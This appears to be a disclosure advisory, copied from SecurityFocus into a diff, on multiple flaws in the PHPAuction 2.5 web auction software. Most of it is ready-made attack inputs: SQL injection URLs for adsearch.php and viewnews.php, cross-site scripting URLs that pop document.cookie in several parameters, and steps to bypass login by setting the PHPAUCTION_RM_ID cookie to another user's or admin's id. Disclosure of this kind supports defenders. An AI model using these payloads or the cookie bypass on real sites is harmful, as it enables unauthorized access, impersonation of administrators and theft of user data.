@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/14184/info
+
+PHPAuction is affected by multiple remote vulnerabilities. These issues can allow an attacker to gain unauthorized access to a site and carry out SQL injection and cross-site scripting attacks.
+
+PHPAuction 2.5 is reported to be affected by these issues. It is possible that other versions are vulnerable as well. 
+
+SQL Injection:
+/phpauction-gpl-2.5/adsearch.php?title=1&desc=on&closed=on&category='SQL_INJECTION&minprice=1&maxprice=1&payment%5B%5D=on&payment%5B%5D=on&payment%5B%5D=on&payment%5B%5D=
+on&seller=1&country=Afghanistan&ending=1&SortProperty=ends&type=2&action=search&go=GO%20%3E%3E
+
+/viewnews.php?id='SQL_INJECTION
+
+Cross-site scripting:
+/phpauction-gpl-2.5/index.php?lan=<script>alert(document.cookie)</script>
+
+/phpauction-gpl-2.5/profile.php?user_id=158&auction_id=<script>alert(document.cookie)</script>
+
+/phpauction-gpl-2.5/profile.php?auction_id=<script>alert(document.cookie)</script>&id=159
+
+/phpauction-gpl-2.5/admin/index.php?lan=<script>alert(document.cookie)</script>
+
+/login.php?username=<script>alert(document.cookie)</script>
+
+/viewnews.php?id=<script>alert(document.cookie)</script>
+
+Authentication bypass:
+
+Set the cookie as follows:
+Name: PHPAUCTION_RM_ID
+VALUE: Id number of the user/admin you want to impersonate (you can get it from thier profile) 
